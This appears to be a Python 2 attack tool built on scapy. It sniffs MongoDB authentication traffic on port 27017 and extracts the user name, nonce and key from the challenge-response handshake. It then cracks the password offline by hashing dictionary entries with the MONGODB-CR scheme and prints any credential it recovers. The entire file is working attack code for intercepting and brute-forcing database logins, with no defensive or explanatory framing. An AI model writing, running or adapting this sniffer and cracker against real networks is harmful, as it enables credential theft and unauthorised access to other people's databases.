from scapy.all import *
import re
import hashlib
from termcolor import colored
import os

md5 = hashlib.md5

def get_packets(port, iface, count):
	packets = sniff(filter="port "+str(port)+"", count=count, iface=str(iface))
	return packets

def parse_packets(port, iface, count):
	packets=""
	packet=""
	user=""
	nonce=""
	key=""
	packets = get_packets(port, iface, count)
	for i in xrange(len(packets)):
		if "key" in re.findall(r'[A-Za-z0-9]{3,}', str(packets[i])):
			packet=packets[i]
			break

	if(len(packet)>=8):
		nonce = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[4]
		user = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[6]
		key = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[8]
		flag=1
		return user, nonce, key,flag
	else:
		flag=0
		return user, nonce, key,flag

def gen_pass(user, nonce, passw):
	return md5(nonce + user + md5(user + ":mongo:" + str(passw)).hexdigest()).hexdigest();

def sniff_mongo():
	print colored("[-] Sniff packages...",'blue')
	print colored("[-] Parse packages...",'yellow')
	user, nonce, key, flag = parse_packets("27017", "eth0", 10)
	while True:
		if flag==1:
			print colored("[-] Sniff Completed \n",'green');
			print colored("Prepair to brute...",'green')
			os.getcwd()
			try:
				file_len = open('./dictionary/b.txt')
				file = file_len.readlines()
				for i in file:
					new=i.split('\n')[0]
					passw=new.split(':')[1]
						#passw = file.readline().split('\n')[0]

					if gen_pass(user, nonce, passw) == key:
						print colored("\nFound - "+user+":"+passw,'green')
						break
			except IOError:
				print colored("[-] Plse provide file name to brute force",'red')
			break
		else:
			user, nonce, key, flag = parse_packets("27017", "eth0", 10)
			
